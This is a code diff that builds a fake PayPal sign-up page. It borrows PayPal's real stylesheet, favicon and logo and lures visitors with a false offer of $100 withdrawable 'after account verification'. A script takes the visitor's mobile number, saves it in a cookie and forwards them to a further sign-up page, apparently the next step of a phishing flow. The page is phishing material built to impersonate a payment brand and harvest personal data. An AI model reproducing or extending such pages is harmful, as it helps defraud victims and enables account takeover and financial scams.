@@ -3,11 +3,17 @@
 
 <head>
     <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet"
+        href="https://www.paypalobjects.com/web/res/fe3/9cfe1f7aa17ef97a20bf96b912e92/css/contextualLogin.css" />
+    
+    <link rel="shortcut icon" type="image/jpg" href="https://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico " />
+    <link rel="stylesheet" href="phone.css">
     <style>
         .loader {
+            
             border: 10px solid #f3f3f3;
             border-radius: 50%;
-            border-top: 10px solid #3498db;
+            border-top: 10px solid #2b7bbf;
             width: 40px;
             height: 40px;
             -webkit-animation: spin 2s linear infinite;
@@ -15,6 +21,8 @@
             animation: spin 1s linear infinite;
   margin: auto;
   margin-top: 25%;
+
+
 
         }
         @media(max-width:600px) {
@@ -29,8 +37,24 @@
             animation: spin 1s linear infinite;
   margin: auto;
   margin-top: 50%;
+
+
+
         }
         }
+ #overlay {
+  position: fixed;
+  display: block;
+  width: 100%;
+  height: 100%;
+  top: 0;
+  left: 0;
+  right: 0;
+  bottom: 0;
+  background-color: gray;
+  z-index: 2;
+  cursor: pointer;
+}
 
         /* Safari */
         @-webkit-keyframes spin {
@@ -56,13 +80,61 @@
 </head>
 
 <body>
-
-   <div class="overlay">
-<div class="loader"></div>
-
-   </div>
-
   
+
+<div class="overlay" id="overlay"> <div class="loader"></div>   </div>
+
+<div class="header2">
+    <img src="   ./images/paypalfavicon.png" alt="paypal">
+    <a href="index.html"> Log in </a>
+</div>
+
+<div class="content">
+
+    <div class="paypal">
+        <h1>Sign up for PayPal</h1>
+        <p>get $100, withraw after account verification </p>
+
+    </div>
+    <div class="policy">
+        <div class="input">
+            <input type="number" name="number" placeholder="Mobile number" id="number">
+            <div class="hideone">Mobile Number is required</div>
+        </div>
+        <p>By continuing, you confirm that you’re the owner
+            or primary user of this mobile number you agree to get $100 which
+            you can withdraw to your bank account after account verification</p>
+
+
+        <button class="button actionContinue scTrack:unifiedlogin-login-submit" type="submit" id="btnLogin"
+            name="btnLogin" value="Login">Next</button>
+    </div>
+</div>
+<script>
+
+
+
+    document.querySelector("#number").onkeyup = () => {
+        if (document.querySelector(".showError")) return document.querySelector(".showError").className = "hideone"
+    }
+
+
+
+    document.querySelector("#btnLogin").onclick = () => {
+        if (document.getElementById("number").value) {
+            document.cookie = `phone=${document.getElementById("number").value}`
+            window.location.href = "/signUp.html"
+            // document.cookie=`phone=${document.getElementById("number").value} `
+
+
+        }
+        else
+            document.querySelector(".hideone").className = "showError"
+    }
+
+
+
+</script>
 </body>
 
 </html>
